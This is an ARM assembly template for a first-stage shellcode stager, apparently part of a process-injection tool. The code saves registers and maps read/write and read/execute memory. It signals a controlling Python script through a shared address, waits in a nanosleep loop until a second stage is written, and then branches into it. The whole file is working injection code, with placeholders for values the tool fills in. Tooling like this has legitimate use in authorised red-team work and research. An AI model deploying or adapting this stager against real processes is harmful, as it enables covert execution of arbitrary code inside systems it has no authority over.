.globl _start
_start:
	// OBFUSCATION_OFF
	// Save registers
	stmdb sp!,{r0-r11}
	// OBFUSCATION_ON
	
	b beginStager

beginStager:
	// allocate a new block of memory for read/write data using mmap

[READ_WRITE_ALLOCATE_OR_REUSE]

.balign 8
		
	// using GCC's own =relative_reference magic doesn't work when injecting the shellcode
	// so I rolled my own using this spaghetti code trick that's straight out of the early 80s
	// the branch instruction in this code is 4 bytes long, so I stash the string immediately after it
	// then I know that it will be 4 bytes after the program counter when it hits that line, 
	// which is exactly what the pc register will be set to
	ldr r12, [pc]
	b store_rw_block_address

communication_address:
	.word [VARIABLE:COMMUNICATION_ADDRESS:VARIABLE]
	.balign 4

store_rw_block_address:
	mov r9, r12
	add r9, r9, #8
	str r11, [r9]

	// allocate another new block of memory for read/execute data using mmap

[READ_EXECUTE_ALLOCATE_OR_REUSE]

	// Store the read/execute block address returned by mmap
	// in the initial location
	mov r9, r12
	add r9, r9, #4
	str r10, [r9]
	
//also store the r/w and r/x block locations in the new communications address block
	mov r9, r11
	add r9, r9, #4
	str r10, [r9]
	add r9, r9, #4
	str r11, [r9]

// if the old and new communication addresses are different, then 	
// overwrite initial communications address with [VARIABLE:STATE_SWITCH_TO_NEW_COMMUNICATION_ADDRESS:VARIABLE]
// and the address after that with the new communication address 
// so that the Python script knows the new location

	cmp r12, r11
	beq ready_for_stage2
	ldr r0, [pc]
	b store_state_switch_to_new_communication_address

state_switch_to_new_communication_address:
	.word [VARIABLE:STATE_SWITCH_TO_NEW_COMMUNICATION_ADDRESS:VARIABLE]
	.balign 4

store_state_switch_to_new_communication_address:
	str r0, [r12]

// overwrite communications address at the new location with [VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]
// so that the Python script knows it can write stage 2 to memory
ready_for_stage2:

	ldr r0, [pc]
	b store_state_ready_for_stage_two_write

state_ready_for_stage_two_write:
	.word [VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]
	.balign 4

store_state_ready_for_stage_two_write:
	str r0, [r11]

// load the value that indicates shellcode written into r8
	ldr r8, [pc]
	b begin_waiting1

state_stage_two_written:
	.word [VARIABLE:STATE_STAGE_TWO_WRITTEN:VARIABLE]
	.balign 4

begin_waiting1:
	mov r5, pc
	b begin_waiting2

nanosleep_timespec:
	.word [VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]
	.word [VARIABLE:STAGE_SLEEP_SECONDS:VARIABLE]
	.balign 4

begin_waiting2:

// store the sys_nanosleep timer data
	mov r0, r5
	mov r1, r5

// wait for value at communications address to be [VARIABLE:STATE_STAGE_TWO_WRITTEN:VARIABLE] before proceeding
wait_for_script:

	// sleep 1 second
	mov r7, #162             					@ sys_nanosleep
	mov r0, r5	            					@ seconds
	mov r1, r5  								@ nanoseconds
	swi 0x0										@ syscall

	ldr r7, [r11]
	cmp r7, r8
	beq launch_stage2
	
	b wait_for_script

launch_stage2:

	// jump to stage2
	bx r10

